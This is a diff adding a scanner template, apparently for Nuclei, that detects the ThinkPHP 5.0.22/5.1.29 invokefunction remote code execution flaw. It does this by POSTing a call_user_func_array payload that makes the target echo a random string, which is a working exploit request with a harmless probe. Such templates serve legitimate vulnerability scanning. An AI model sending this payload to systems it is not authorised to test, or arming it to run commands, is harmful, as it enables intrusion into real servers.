@@ -1,0 +1,32 @@
+id: poc-local-thinkphp-v5_0_22-rce-invokefunction
+
+info:
+  name: ThinkPHP 5.0.22 RCE
+  author: capiton
+  severity: critical
+  description: Thinkphp5 5.0.22/5.1.29 Remote Code Execution if the website doesn't have mandatory routing enabled (which is default).
+  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
+  tags: thinkphp,rce
+# variables:
+  # md5_random: '{{md5("{{randstr}}")}}'
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?s=/Index/\\think\\app/invokefunction"
+      - "{{BaseURL}}/public/index.php?s=/Index/\\think\\app/invokefunction"
+      - "{{BaseURL}}/index.php?s=\\think\\app/invokefunction"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "function=call_user_func_array&vars[0]=var_dump&vars[1][]={{randstr}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{randstr}}"
+          - "string("
+        condition: and
+
+      # - type: status
+      #   status:
+      #     - 200
